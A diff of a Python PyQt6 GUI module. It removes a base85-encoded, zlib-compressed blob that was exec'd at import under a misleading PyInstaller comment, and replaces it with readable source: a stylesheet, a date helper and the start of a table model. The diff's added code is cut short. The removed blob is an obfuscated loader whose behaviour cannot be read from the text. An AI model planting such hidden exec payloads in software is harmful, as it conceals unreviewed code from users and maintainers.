@@ -1,19 +1,1001 @@
 from __future__ import annotations
-import base64, zlib
-# Static imports ensure PyInstaller collects all GUI dependencies.
-import math, sys
+
+import math
+import sys
 from pathlib import Path
 from typing import Any
+
 from PyQt6.QtCore import QAbstractTableModel, QModelIndex, Qt, QTimer
 from PyQt6.QtGui import QAction, QColor, QFont, QIcon
-from PyQt6.QtWidgets import (QApplication, QComboBox, QDialog, QDialogButtonBox, QFileDialog, QFormLayout, QFrame, QGridLayout, QGroupBox, QHBoxLayout, QHeaderView, QLabel, QLineEdit, QMainWindow, QMessageBox, QPlainTextEdit, QProgressDialog, QPushButton, QSpinBox, QSplitter, QStackedWidget, QTableView, QTabWidget, QTextEdit, QToolBar, QVBoxLayout, QWidget)
+from PyQt6.QtWidgets import (
+    QApplication,
+    QComboBox,
+    QDialog,
+    QDialogButtonBox,
+    QFileDialog,
+    QFormLayout,
+    QFrame,
+    QGridLayout,
+    QGroupBox,
+    QHBoxLayout,
+    QHeaderView,
+    QLabel,
+    QLineEdit,
+    QMainWindow,
+    QMessageBox,
+    QPlainTextEdit,
+    QProgressDialog,
+    QPushButton,
+    QSpinBox,
+    QSplitter,
+    QStackedWidget,
+    QTableView,
+    QTabWidget,
+    QTextEdit,
+    QToolBar,
+    QVBoxLayout,
+    QWidget,
+)
+
 try:
     from PyQt6.QtCharts import QBarCategoryAxis, QBarSeries, QBarSet, QChart, QChartView, QValueAxis
+    CHARTS_AVAILABLE = True
 except ImportError:
-    pass
+    CHARTS_AVAILABLE = False
+
 import core
 import update_manager
 
-_PAYLOAD = 'c-rlK{cj`3mEiCCD{9-=b<?Ifl;+bMYZe+x_6Q!$ha}qxWTDX{n__#K-JI^GM)a(J4T6oaw+L>1*+UTQF5-z1WRqPZ$t8!wj&QgiXypHp|B`#}Rdsh&b#;@P%*4CE8Xl4CdiAR6)vH(UtEz`_G-i%7oTk&*a~$T6CsCX-Hw>fHP5mfLR#wEbv73&v@5wA#8DiB5JPiC^R__7AP(eDI_~B9Zd?TE#@aGR^57TR{hiNy8y{z=%MlVTYx1a92y};Xv242u)59xC|9C#=2BZYta{@9CEEbmSI0!bhH3vk^ih+_DBHwv-Zc0UT$S|9m?BQH&|n)V8V{~m5kCV}6lK{xr6ZZz&ix1$sBbJKT&=t%i-dzz+ESb)6i2c81<ZWNF2y0d7SW)EU_?1}I1#r{Akd@qislLFfv_^OoO@!WwIf9QKp#DlwT4`?O6`=Pfr@H5yQ*AGAP!$Fk6?s!S!9(e`&2LXWWdnc(>>p>hH#Q>-b;=wc-@sWxLdoZ^Jo;{#jntE~eGj;oqya6Y&ct#T|^&5Vx<!UeXqbRuTW(Ysj$&giTtgNK*tV0h~<{G(iF~1K1Ro6|uqbQzjocKwTp6q$C@8#c-QK(k-Nu7nZ-C*irC2FL5XJdDN&)N8JWBcyL?YmoSo$bd{Z^b+5dy|xHQ+r!+9L1d~_;=kP@$xm*hgFb$pH2qQNoVYaFiY{u%Ep5S&i?j3)f!q)5wwNR?rrRBoihIW!>!%D?fdsmEe^i7|6KyNENew(fQ)49DeJ-H908k!gARLbcy)Mv*t-ecfE5G3SFf+NFJHdNhOlzp8oFaYn046edq6pleX#wyC`kNIy$)M#Ptu$0bS0ZC9rx<m<*Qc#cQ1;8XFDv6LhmL^CT<_(LWf<OoZJNIF&NOV>-bB;#Tgq=ik>|g`KhNie-)dj2TwfzXp{nyc3VQ(W~*xgYr(&zPF}lqb#UXR){NR^{_CyS9r)A4&~dhU86PQKxrSX)TJDUZW3NP{_VDVp-arQ(_zA9;fe!7y-Mikup+Ucvcp%^gZamY$z3bj!c(s__wab?;U(p+TZQzDS<&O2QUmjfMu(@231Y#iqbTLw_Weuf9+f^W35(WMM+8PdScvnk=zN!%VYQ`a%Br&6R0}w<ZtfRMz!nZO43~vnGVc*yX=t0|aZ?Yp0$pH*FujAbSBEphLyuhOk#)Np#^W32)1L-RYdR_?cPAB1Dr5StM8xF5aGj`?jl`BJiotW8^GoC!8D}%mw-LytH8M#R4bS7@-VMnToVxTie0ZX;hN!?!6IP!kKjmw0laO}oMewcN4t(eseSBDd^%>CxI3YD{6b7_Xl$E7md4XJ-=G$9dpQbE70P3W?p21vhT+JkkN#!>KA1f%oAj=*)31>P{tuu1ainixE(1g|}s_+2+1EI)|8cf~7<C*BG!Ta=)PmA0@#l;(n25~gcwC1H9)3^YfxFUFanxz@hkzHv=K^S0O#cpbsxSv^^HUokhQ_waNDH?ozLfj49z6DNT?bB=K|HvR3OTG?Q4-D03U@(tG?GAd$z!tTNH;7{?t*aHnWgq@L|q#&bUpM-iGRU@k%c%hAj4R&iCXbFn&fPfFKbgmw<b=X?pvWkb-J2$e2MN7F#lKn^9`UG?eXpyRQR@;XP#H`82O*Vk?9JZC9R%HX`h60*QheQ7)!?fD&sF=hsL0=f0UV1u)f3wr4yw0hWLkfLmi#}kEIwl<0z>5BRWu+guNy0XLSzEUa8hnEz#kq4FKlD?_v0-Tsn=Fo=0HX$ek{%2I%>mSG;#3|UvcIBPgVEtf6B%MU4m03%Ite@u4S#g#MlpzFI`Lw=(aPH`NQgaXVF#cVeMB)kI8=*8s{oOG<3Ra%5-)XNqTGe!x!?$pl~t~#{`5SMBD)^6%86Y)n!ErwIqN&D1hC~aywzh>aeLuFX*eeVwAKX)l?oC7$9iG9F4=5$gNEaWu(;W4(1pithuyo;Uei}3uDE<0QVYC4FS`*jN~s-bB7MZ!Q7uo9=id6mw6&dj<4pkFh2O1BE{yQI#CAY*q%>h^`3cBfe_%I^YYS&1fBwjup)8WRcffJ*Uv}g0K#~_+zO5H?FM#1IK(=5@w*g@jBwa)98IA)*Rn1V0JvGSPrSPH_xDohA;TYx&pODn_6F*E+H|z^kO=kOOqz{A0O&exf0e}tIb7b!Z?h*gBi+cyGA#>@6UHIw6OZE14zU7t)k$9lE`{}Hn=2ix#$!mWoA%LC2L+j8|TaX6Jofo$C+R*dXytM_$p15%c%EU70Kpz`ilhDbGn6HHqsi>R9iV%BvhtVv7UIQd``4b@F{o?mB3#DR-X4CR#7iUgo837)tgJPDYF1GGK@u#44xPcLwvH-=v4-Zxkb&{ddkm>JlvQ=3qf+ZFY95*dC2BI7ZDRpZQl3x)XZT1d{arTZT6sx;Sya;~|&GRZY>-V{8X>(1pdSfP4wu1w_z-9`&!~NbTK#zNX+qQ%nD{)#tt{YfAk|T#2)Iktc7v={hEZHH|Ik8u-HNlRDfApy}O(Mhz$W^c|d<M4FwyMDly(RTnuR@g2G1J3pKm%^leM_WhfeFBkFI(^5B2cNhhN_Qn`ON20(~b=)g+>w-);8#jykhgzLUt_6YGP$CNIXe#ZWJn^n~Zu9%suFUws1IA@!E3y6-QA$-*9r^l3AC%rM3nkF~|P-+5ZfW*yE`ivLk=~Y|N7Rvy=_a&;G7IV!iXT&%%+VRo5q0Hf$7$I*h$!gpC#M72CQy|6<I>=V$-umtkA|z(-#xh@CJ5tYXdcLc=g6cF>qn0ohAI3iL;IJ%&;<NNy|_M9k|5P9s%i;ydUf!9f<@Yh5JtfeBEhe5%MTtM4X&k7Q(Gb#kd>-9CT*CCtXiXMH!Hf~Hy*TIt1}`^Z%P{OljZ1eU6SMdBZOPFB038vFWl7noucoj(U&`1<qnv!B4Gs^f}1bklkR2gjjc5=;fXAD=(}bssFi2!6uDs%{NDHy!CHzGBCbp;=&6Fa&3gpCnVY*)Gxzn0EdwV*Szi^Pi_I_``3`&%RW#oaWz#V8{4ilc1Zy51AKE$6gEur(Mh%mkf!m>tfl&OZ<cIAQRZ7OYAa!{yDo`$xB&viIox&H9%I%A_#Wnjx7mBZ%9Hx^g=CgjGGOX7~xDiPP@s(|K=(M0dko#IzRgyCj8O-S1cWQQO?8KvH(@u!zGZSjf`E)eVKM0BzAH`xHUo9+eOO@l)A*m&_hMVF<LOtgl47-?PmQznOoZu)hw_YZX4I1T`a&pT4V^h2cxcGa+|Mr6}<13!NeNP0l)tH#f#DAOQ@)1TtA14$jYfwrd(~kQO=ayqYHZ%pxWb`0$9ubr$lXJB+2L7DoR>HJ}=_0a@*4KAqT2)9Z-pRAyAPSa@nPz)G4opg+f&$t(g49OF{;`$chm4UjBjzA|5N|EDJ++VUYg$+4sj~*r6XMsS}05aYT6E2dVK>pG`({PM+t#m@ZmEU9rK`@wiSWiN$47)YV#+!B>}O@CvRewcRLf4-&L0#ti@(d*=|?d+1tXA6&Z%+zfvX%R5!pr7W18TXuz7gK=R8o&2sJ@{Oys_$0t$1>RBhR~=DJ?WI?xHV8v2G$7S+$Q3}@t>^Ru&y5|bn&_JPlaUXLwA@GHPu<bwgB_oHwPfhjedKMVc3bsqJmK-_b*k5TqLWov$ozTP+rgi=fUmvOyX&GRp_t`-oVwuwN(Og)#$IcX87~e!mYPPTi5zN~+9WAU*x5uMITp1flML|{Zn?H30fm$)Iw53zG98cIcqVm%uaOK6bYNfzM^|p`I%S}hJFT-;YXoHh%%5tYDwi~L2dJL)pppk5WP_|b|H9{a8*hoM4csce&qgRpL(r!{va%ljm{Q4)K)XIa`)!|0xR&N0L)?6G5Z=HF$D!^SG_Sp4Jt5wP!3ndnOl3~8Y%&O_n1jXzP>f+IkAj&%L7b31%C)ncbsF-jRvTXwwIHWKkp&|~wxWp$G#qqp$Uzg#q`^7O(`qE9=mDoBw6sO0jcTy16w8J(bT}p{B!lY@Eqqvc7?f3JLEvt=lZh7&Z1N)80DPdUtA`DZQNWNF@jn93_WMH&^}yCV|2?QK@%(>l{8jWZYZ4K`dYlAq-?N3Tz%25<A9U8%l-*gbCweXof5ZcXobI+(Kvq4cEXSjlqZ0@1bz4`<Rg0utYa{f>q{rN+NMK^~4z#rAE#7+mRO*0x;wR3Dm|r>1%GP1B!53uIAZDbmW+_*C{TcR`#0F;7!Ax6!-f9mm6V#3$$~#O>Lqf|t)2s*^+>X*T8rRmHRn@(#YA9mH)70&cq?Q*#%=Fd+?+EEedf114;)AASQzBW(pI<Cno2trEK$RaaECuS9dm)LITJyNusepx&dlAt<<51SB+>wh5h^%LZnvzbg*CGnba)lmPhl`{LfgN1!Tt8%QGV78BfBB=%l}ZUBkFN?Q8^tRSGn=p_|4oQH^Yi}~mgG$eRt;Kv|0N{8T_K?w#MLrFxbSz$xw`3r#Sn-TU|VE5FB3ItiU?Ro3wAXbMH&+MIp#m)A^k=98yu`0c;e};oFh%qnV3vc`}#F*^<5|?RqK)vITr^{!L;{+fz=Ts<a&OSJ!*goK>EMc(L?BsQ*Ki<*)d5jB3Wiipbq^=q!F;ER_s1;K1sNf0ors%V5V57hiWGaGhg#=U@x2Oz!sfEH(87h;(sPL8M8$X;rV<1{23|Me`hshq4u&oUi|BRl-aT`+QJ1~4jl2Z7pHz-MO(3hmb7loBhjOP4sCo|^1rP=fZn*6k~`o}THPQ@%9wyXKcP%VJ^X`DYx*Us7t8j(*b0_ivF25(Ctv+BYm>Kt#sdEW{QmT`cKKp7<Ese^NAQu#Ze_|3;8-a1Xzh>YzZxr!XXB#3b^{mvTKfXwL|B&SvycvL=q5ESBt?$p>Cu>nlI2I^cab1{h;cAA1Vf^tNohZ@$jOeo|H1z4-K~xHop-ml?r!dNbjJs!2(2?KiKcNMw)8YL<b0s3#}B8TsWM3u)tjh!&=Yq&38dmll=zZk{<O;L!s9nIR?T4}d1g>T!LBu)j_uX9({9thI%wM8F*nGT_$l+EG?1U#n(pNVGM!R4ohDXYpR>8D?li2pZIa3dR%Kj*p3lEzk3bDdQSEu&*VR3mnrV!yM5u;UL$a)LP0ZvIl`(-zbZrPLhl2K^tij%4?eb{LgUKt@(7ww-6#N>g6R(c6*^;mq4AwYWd0A|3>~9&DM7h%s&;lPt0Z4i3xHTAD8jml{;6H1rcJ{Y-UP4>!&YjNAj%9EyanW%A&7w%)$P_4)J~&Og(G#0zo`5aT0S@D^m9bT<_fmGLJ@?o{$+c)R!<3Mqyqmdw%qG@%Gye2N_dd<9UF>|>&L+auB*)8HR>ef3Gqbeel_WEHXayf<o?bq0W>>G8CBrKgXJZ;=KEiIOEWiWqwn3JeFlRz*In;e=AuqFn4JcBo+X9;T6T4(dV1;5X_*Cm|c7(|S0a<c^?lDFfo<*5C;z&fOMR~wY8@zO|u_Y2Bg`NYd0-C2&l*{PQgWZvo;Q6mY;SpoU^Dju27tuS}mJOh^cmDj>DX=Zb`@ZgP*1f<&Hxh)<?W$yn#Hc2N3Bz=cbT+wgDxOpoC@%d{!6rZ~C|@l<bx?DHqP2EgOLL1rHHU)sVr8mWP(FreonCapvxWG98FG^TgazkkKa^cO95~UUWd(|o?dQh*k+RnqA&k;`fBtV{Hi8bY6gZ*D#;|`U=VzZcGfwD3;ost~KRgTBF$Ewf#|HkiS}n`m66b{nczAYULYEw#snA6@YEonBAVB$c>&itV`Sx$^Q=U-&{P~xeQ&>$Em)bQ}0weMHGh9of`7_^C7kgx^DTv#fe-WDM2_iXy6SN3iA(WN0h^E}%X3+snM5ywRGW)wDJol(glxQ41q*y5JT50GMJSV63?Z?0`=V!m1S|;cv6a27(cS5ItHT2(^5&`j~PH?Ha_n~E~WJpltCqm88#y;^f3i_2+r5=gmV{6L!UKNn}G_5U0D&}x?AtX-l0*u8BEP~?WuGBbW38X}0qp&vbw8++#Vx5~V>^RB%8E{dN>4<xvBDmLirlcjzU8z#F&3lnN)uQ*t?BXiGa#E?G<C#-hv%HYdfTFZ^sx5h`mYH9nAdh;Mt9fXUYpv~_pMB+8X4qv`kOFUBLr~&m$5+c0d3r)=h0lLy>J<mp`^67ySA!e7#mg!>X5<Dz`6VH7*h_-)u2h;bMLj+DW^sbpg)_tQ3VYe9?c3hSJ@%v6E?Q}o3dNIMI<2+<A^9v#$hgZAdKh^5Gb6S^G=-0@X<Cy}^aKb>zWUllNzz2iQOS?}9h9tqJnL*guHhY_9dVEGa2f;-2EDQ9PNqZgvYsEOBg$`cV)qFG+&h|oF=JrIl=A0zLm03Cb|wcj&yYtv{b)R%hSb7$=3icVFj9QhW7h{h^4+5_O8kV<;zsAse;I;)5zU{4=7y?M??jVaGjN38h>V1P1Gy`-9Wzp%5KdTApHt*^rYCZ=90I1<nS#R3okeAxQpaAn_seEl{lrOWi;|JU`%;^)h-tWkF%TB_RtbWXHRIryPie%q-FnzQSXZC>=7yvxQB+SpZ&mq`OJ)d5&1mk=o%84aI%VIv$8l-S(7fD!v#~U9@Ws%3xg0{0U_o+ge&*FIt)vW5Ej5%M2h5E3sz{9nZVudBI4-oD9II>c0<oe+sID%Ls=Q?D5Vv1mA1{)PYseO**;SKX(IXJoYq*oxJ9c1W*Oi)Ye(?7UEF)a36mk5=zEx3k8O=+rVAOG_6g#Zd3c=zxb&z*1ai{E?AN&uiqSDfR%PScBMx}<nk;g?lW7trsug_9OghgOE<^_OR#|>a*eP2`72y%&(V%4TDW#LwPqzuS(CxM2nboB-unASaGW>F#~<nl;;o|cQ*QQ0Vj2a_WJX{~7^<wyhHz6y*9ogssciww>><l;QB*Z~{t&BguE6q$x0#)4b?1xA=@V@o-Zm!@BCC}JQo^Z70$-csnYp}*+BWn7X{)X;-9fMMK=#A(}vTvM9ULnR09_o}x_9$j9_y&F<r8wO{85l^H}WS%WLxo?O*5=;*?z(;%jQRoJ`J)~y%3zR&opWR}s=6Dzfi@kAl?2)r?wTuwSBrfC$1)=JYWo|=p-dMYBB45;llYHP92&GY1#x*%y5!U1vhae7&vB1Zzb=Ky-miAJl)6z!j@6wsLNwV-H0?*UQeC))SkEdQd%MQER<!GWL(3)B)dcD?V&$JrDQNaa^t}D)Bg`0S+R%?VfcU|@sFRW86rS-y3ys#GT4D0zGQ7)s1#kv~6D4-hVC<c8RROsT^L#$Z$h#5u3*gZit3ok-#^*ukZIl@a?0HvX5vBd^=iz71J!Xx%SDz3ikA>R%wv<T@WKUZ&_<^ZRco)Yp?_RU}a1A9vS?ley^xW$iN*QsY)A>Br3%OhE>QJKo{@9?21R~B$*lwk3y0B-r33|zf@BbAL9$*mGlk{8F0PMUJGQQ)YKBKqNwaz_DU7D?=m{_q<f82TYu(0Arv&cshV-2aobAf-6|J;?pG=BS~1d5JvHoEMABL_~iN+K2qY8JUcd52z$nvK%ZS3si!as3MZW>f)Q|{K*6qsF3p9DFTVE?BRt6mOoI^q<NlXhNZi)x8>a3xV?3EuU=Q<0$R<L;`PdypT6-1|E_M}9mT5wlQ$)|(Fpyo%{;XVlmX1ywD2Zh79LH{&wdn2#V`R_x;g(}FvU_azr)qT`NDEM68_JA9#W>Pwux0F8<-MpfyaP%d`cuL)@74Z9W&jjPL@l{gI$dla7JI&kaI&wX9rCbtyYPlw`4uMP8ZM3n%b7$(4))mNV2%94{t8p2PtZ$_X2OGZZe1R`SM$tk!>-}1)q>jCziJevklJAe$4`yv(Kg!qJ)1Gd1Lk)t&<=*Y23Wo-TM%K^^@a<Ra!&XX6*_RaCl9&jldwP=x#n;X-G#%1B)89s?8hH(XzE9Xu-AFe4%T~Lr$5pu3f8Eynt%);_AhVsu(Y>W;8Cc7f{0A32_WAPx&`q%M4SZY^|M-!>35{Q>$8OWNw1bs<)(m>{A|d)(3G!4Ub2Dzvv6*+W{JRhmhlBrPLf+6Tm-O0<p;aRg+`=p@0`6hc4I>tBQYg(b=>ivcS}#lsK1jFK}(*N=I02(L#O+iJ42QQw1vIg<`obL;4GmKlsCMre@+R0l{x=f0ixUnw`0d8xX75ZN61zsO|iJPX5p$v#*{*+%S2<eY#TT!PZP<`Su-9TDi&+vJ;^lVU$|VjQjd?ka=AH{Y%!}+q}z?^XLB;Q>O3&qCQL9h{m1!f7v6@ZV+2b-8Qoxsa?`iPQR;b>(wkINP02W|5n&SkXB*~kuAtyBd}DmpgTm*6<0pjFL(>CTo*V({&~S0*rXJfd!*^giWE!F&;FGsFumx-YHGMb%TiJA6HxEYIzRgtw8YNOevVW>Kl^RQ)&uNXh$%r{k%~jP{r{&gv-#tx3tgT6ir+o(J<Rm_N!ntT+6=b_j(mO%6in`CDPJI5?=RK>Jp7%uP@w7mPR)S6@LQ;j$%wtLzdvqS1}{c-zrjbq#2>}(L_goB5=y<bU}3frX`MA0l~|6A?|Sawei+QO#(U^9DP^~GxrvN~R#PWAxH(|L%e3Y>XPRO;g6EFsUqmE|tjd}d`7x1Tdxco#m<rkxt5q<1pA8s_epJR(DDy=-HV}B(32i(xsh)r)5WZ`x?_tm<4>!{4xibX>@%1nAa7WOCD4vz`dGGS2l3;vYF#OT^^Iu>>#{6e;s4T-^JbWpk*SaoBYLkDm+84a$Nw(UXy45ZcUV#32!V8*>{IO&xVZmKI737!iZ$hSky~rKp2Zd0M{7_^l_+jE<^Lb&432`EOVane|<cZXW`M;ZPL8D6nr38rLM!>o|q6D?H;J-q{iW;xroTkbZIv0x4N>-KFrt*R#M*zu=1HN2!g^L!O(P?mh;)R*hASs-Jxo{I3oXKgx=wqz83;4P=9TN)3y-A-Y_XrolJd^z<vs#}-erOZ4qFH7#&ET9tT~U%PFX{%RF6zF}`By0k0WgKRTeKj~qQeuKsFobbTEs<uQx~Za$6g%!1Ft)clZft+<lpv2?!;?-<oYT9-Kch?V4RA2TAca`Ora{H-pQ3Mx_2kDzQj0CX$)v`8s=J=Xy$hw<PzMrzWJvgF}wys;BC2y!+kAfL`!R?wJi>z$se<)<e8!lw@~PvcGy$Eb!s}$R$g7E$h)jocFYR53?irf`=J{I8oiadhvuPWPn&;3SIun2_rOwaK{g&kkWL93XGmQTXP$muq4HW1x)wy<J#a_I%rz+;+ytX#g-h3|)a-<MKr6E_9`ZY7|8y5MU*wABu6mWN;*@<c1443b)}58%5XQ4B0pH&Z$5!-8#Y{HEj4h}j&16$bpf4RV%3nfIeOgGs7)Joo_?La-S)WoZQ0RV4W99EESO_m`9nIpU1dDs8oXW%9=1+2)cI`o%B5G&pHI~T+TYSQ%%0ker+R8&02D^fDR4qtG{3;;BUEp$Y)ghTmtK}7>>t9f{&tJzuxw^>vCcPa4f}i^=Ew0TjV0_Zcw>PV_ZdLck6OBLiv&`e9AN!Lm+j?jIdzQi)DI=0&j!iA*NSLIkV^jDU>J<AWa(Zi1dCkiFm6woNY8HYE59FCoPUfQI1?yKQ7B1ZM)!W$ZtS9Tnekt)LIh}dkKm-~1+t(#>^!YlX<MP?-Ygn;K<nN$i`bIz!or2-HoIj<b+#2Gh-cn<U+#D?gTxaHpe2NnJ7T7w%S=*ogPLB)A=lG;M`1ys`c#G2K;n4zX=S8B^eU-dDH*)&;Z{(&<FpZ#13KzfhptW@7gl8)wQ#v9MA-9+~l?Ci!>87lMSa~&7aovJbfq}EWR*2XRR}_c82zz6R&8aFd@XHM)v+*KPT?)?U`tsi6psXuD{9wELzO(o6uJWb}<qad!(Z&wGly`6I?pAj{i;A<2J(hZ*)AK^;b@%=U_x9~K8u&DcoX8pYc*b_`gB`m#<&u^5U0x!caiOAg>fjNVkHdF&@9*SSASNG&@9p0I-~qe+-K_18!~46NTf6uqZ;Wkj?R9Tja%_CzeeQ-~0b_`xMop%l5^AzyEO-x<eE6l@>5uMg?QXIB5d7<=8+cxqMxwW78c=>hOLp^*@pgw0mM$KeT7xZk{>AL#L(|UuG(QeSquq_YefyJX;A2n=49jVcE{N2?SDUMCe4iaFAoVtAj<@gaZ@ss*o3TQ8<j$%{S0czex7h2ivyFS3dS`hF_81FaPG4`aHI>b<tEM^0cPxH+WM4VYCr^W#ZC_e5eOC~I-q0d3y;@K0RNvLQbh`2%#uNrMc*c%FB!vv+4BbnSdyrq;6n;Df^Q6v_Bml|4<G#KA{AW{Cb8(_V(6&Z~%P^Fh+)>)f1!W5azLM1;RgvzhF=}!_<PIDHl}I@a4e_Su&t|ZaGs0O4c!h~L4IN6jUeZY9mwi2+l1~4h#Y)s^r`mth@TJ*)nDi3G<%m?ah~HqUuwwP{o88^s+1|%1X>MA^mZZz&?$FzW?N#}zPYv?j2yca_zg8ETieQ6>{eD%xPR?Y-a10kVb1SUYKgw=f&S<VN#d7&pEUN4-SC}mQ)*(<6>2=AOCYCQ}L-eAcbKzN5D;*%NL)r4m7T?0dT)AGSp5eg^q-mZ-BhOYVjf!q)p7TsE#e8%7Q-5O1T4SRj8(zG*!}4eih6!G`+6OI%Bk1!R=D0#@@JnCJ4!`gj+GUI!Nt9tOBc8GT5>Fq0k3GegQ1bUrHc#1ravbcG{3W0Yva2n;!m;%-lN!mUlx4R$sqR%7d?L67_TD3fDtUlQ-C6Rqj#psnX&rdvk>|m|#+_p~{4YcART+9-iZV6%6TiYzz9Xn`H8hJXI=rT?FI|xPN;0XCR<xOwb4akLCVwO=R=44`)pi-=PCC}Iw1(C@y;~1PKEJTy`IlkmolCu2m`M$j{^8c{-uC@_r|<OQTUNOmru)d?o41_@8~b;v!1rN=WAxzXMS`MS`}Rin{SO{Eo7=mDpo~OKC{qnl77d4iAA0l~WaKdhDU?LG{%AVGL5}CY4_oa0k<T9S;~^>CAy&+8la-qNWzj6R0=R?-x%--$8oBiCvx&G=V>JJQZZN?n-;1InV6)BGKlW~dm6ekLH?B*>UOl(}XgWzQ>1{vaZm=F+NP(xDzW#jvFXD*P<0;)5PB*2<{Ws>WX}pL0Al)@EozT58rQ{;zR%r3&A37s5;dzDfz$8W&=!}_0MN^t~B?^j5_e?2;w?S@<<%#33E8<2OP`+Se9;V{m6sX5;=nuUlZQ-5nhN&?UuH3hp6hLL*y85ReDb-n+Aea%3j3M1Ldf&{-RvnI#1r)gB-oWi-??UqWj~rgXPGFx5({-K+V(NOuSb0NL70QNFiGC{6DAta~(K26|uH!Wlman?fRb`pnr_5?}n^=04ip)tWlitQM@j^%3z^b&cbAI+yMGhE)?0NNNtl9#&YFbIi64;Qg<FvEOmp4%6HZ)Xb(&!z}<hW(5y>!1Th+5zCV!vn@u0t+TL$ygML*%4e2vmb>;e{Rf?a6w1QM1U8qjnaWWFlvnsL=;&9{Hcwy!eT#d?vZpPm0;AIx(fSrCAuN<e}<Z{&ZL`iqM?ra;Q@$+p6=|%mSU~eQ_7Jw7n=hiebl4TyU=-GfpUl#Rf+A!wivM^6kvN;55|`V3^I5vcrm8d3j?oC#GdqAfK(;vl-e|(MvX~FihQ1te2O(R>@XU{+cv)ZKnLh3B4zHy@?kmxa3F?7eAUzR<auxm?h4q1I$V`DLp&|w4*8UtrwrI`uMEWG<h*(Yl7Y+`B{h=7|(pYM`p`?WhoMLp<!j{Pi4|#<|O^bQy2+`^<S4dOfS11&7Zekm%C7ZI;%7}+Kb}5IU!_*&8VUoLrYWW<It+BO4vKv&_52#wU!`;Y_|Ym%2-tMi_Xy`vZmCeG#j5C&41@>1{EFt!Q(ghUdQvZANknxpRxdl++zE=Me+0gUs|U7LyD7Xe|E8xYC21m1T5b#on?2@z6-mPGw|aK_=5-ZmW=L3_s$loA`0}Uet|i!c!?Y1`N;-#M~|Z;yu+OIF7Z9PpnxxWPGbY7l?*c6ocJ}NzrZ}KHoDo{`cYE3(M2x>Dy(2@5rUm)K$$wY>8VfTpVe4){19Cko70#Jowg)tGd&>+ovext7(;ZYdxH+1G!)nQ(06f(iQyV2e^|8n#7+2{H9)dA%*ora>nENr;6I?BTbP$)b46-|^sbzymicukhWi+dWXa#+({3yT<}dLX`=R~z+x+}xK_&JEG6V1;HEg=4%zVXIRfi1SQMOyC(}yZs$LJ!rwaL^-n)T8dAQw}59^W=&m>tYtprzvvn)&)_%DjND#2b5{aj&o5XjgL>c^4|QzI6T-`feh;sO0$k`M={7p8ditOEy*iTaq}ngsGtm=4TCOPDUQP7(Msyjoh`X*D89`$5)`$s5jd7TE0n4oRA`}uGw~5+-9cZm&GAu%Fui&iCTWTp=H(F0-+5)aHk>Yyy7VceaAcTQ;7z`B-|q@EJ!ke7V+j2w6tpG;PKSIuo7)Nic(AN`kTt~+sc;K0Ttogr{KwmI5ri^pFu%i+Cr;Tx-(b(j_Ze9lG_i9?|+=P-t=O+jRy~${q6m`TjtlytzN|~?QK~creGuXT+-wA;p=TzR_jF}5B46rhW8L=5QXKRpN!b-vTy$SXY9T0`S*6%-u!#}Z1eo=zjg1h+vjILxOd0WQ!4;P)&qgH98gX~{93f7zdyuHM!m?TTL?C@?-(7?UtBKUV=ukw#(4Uni2AFrRp%Z=zAg5#IJ06t-wR^_u;TE%a!3h`F@2gJqaiOc`^qdpVITyMB0>h@5s9<La$+@=G(c-nJtAIH&fHy8BPU~%ncu8zu2xVA@1y2tb@h|^=9*$2#BJ+~kLQ@N0L|$ztDM!exRRIwsG0jk|Dx8(OejP`kujMFHfw+>zvd-tuL~7pH_%ci660HPXnE6R{6e&$WW=zP7Lt<PH2a_*fC%9C|Bs^721TKbaaPIwoekUQ2Pf0taCQyY+<3um&Y4xW2oej{T%1w{va441A}l39+q~vYY5MBKiH(Eq$0JQ!8g~9R!h$27WRWKTS1h}co46@#FxhL?EYY(5rZMA|E8Z=%+^r!MTkgsV4i2*vZMp=}&)gyWFez?RgG~Im6Y_~m>VuukV8z5o$2kC{2o(V2`zBPlncdsi*-{|)(iyU$2eiTRz5VZIo81%I2cbD>vz1GT?Zp#ugCXL~?xb7saTi8S%W>$`f#XmnrX#Li=Jw3qEJ?lb7AjMm0*#gb56$AasQ'
-_SOURCE = zlib.decompress(base64.b85decode(_PAYLOAD)).decode("utf-8")
-exec(compile(_SOURCE, __file__, "exec"), globals(), globals())
+APP_TITLE = f"{core.APP_NAME} {core.VERSION}"
+
+APP_STYLE = """
+QMainWindow, QWidget { background: #f5f7fb; color: #172033; font-family: 'Segoe UI'; font-size: 10pt; }
+QToolBar { background: #12355b; border: none; spacing: 6px; padding: 7px; }
+QToolBar QLabel { color: white; font-size: 15pt; font-weight: 700; padding: 0 12px; }
+QPushButton { background: #1665d8; color: white; border: none; border-radius: 6px; padding: 7px 13px; font-weight: 600; }
+QPushButton:hover { background: #0f56bd; }
+QPushButton:disabled { background: #a9b7c8; }
+QPushButton#secondary { background: #e7edf5; color: #23334d; }
+QPushButton#danger { background: #c73d3d; }
+QLineEdit, QComboBox, QSpinBox, QPlainTextEdit, QTextEdit { background: white; border: 1px solid #cfd8e5; border-radius: 5px; padding: 5px; }
+QTableView { background: white; alternate-background-color: #f8fafc; border: 1px solid #d8e0ea; gridline-color: #e8edf3; selection-background-color: #dbeafe; selection-color: #172033; }
+QHeaderView::section { background: #e9eff7; color: #24344f; padding: 7px; border: none; border-right: 1px solid #d4dce7; font-weight: 700; }
+QTabWidget::pane { border: 1px solid #d8e0ea; background: white; }
+QTabBar::tab { background: #e9eff7; padding: 9px 15px; margin-right: 2px; }
+QTabBar::tab:selected { background: #1665d8; color: white; }
+QGroupBox { background: white; border: 1px solid #d8e0ea; border-radius: 8px; margin-top: 10px; font-weight: 700; }
+QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 6px; }
+QFrame#kpiCard { background: white; border: 1px solid #dce4ee; border-radius: 10px; }
+QLabel#kpiValue { color: #12355b; font-size: 22pt; font-weight: 800; }
+QLabel#kpiTitle { color: #607086; font-size: 9pt; }
+QLabel#sectionTitle { font-size: 14pt; font-weight: 800; color: #12355b; }
+"""
+
+
+def display_value(value: Any) -> str:
+    if value is None:
+        return ""
+    text = str(value)
+    if len(text) >= 10 and text[4:5] == "-" and text[7:8] == "-":
+        try:
+            date_part = text[:10]
+            y, m, d = date_part.split("-")
+            suffix = text[10:]
+            return f"{d}/{m}/{y}{suffix}"
+        except Exception:
+            return text
+    return text
+
+
+class DictTableModel(QAbstractTableModel):
+    def __init__(self, rows: list[dict[str, Any]] | None = None, columns: list[tuple[str, str]] | None = None):
+        super().__init__()
+        self.rows = rows or []
+        self.columns = columns or []
+
+    def set_data(self, rows: list[dict[str, Any]], columns: list[tuple[str, str]] | None = None) -> None:
+        self.beginResetModel()
+        self.rows = rows
+        if columns is not None:
+            self.columns = columns
+        self.endResetModel()
+
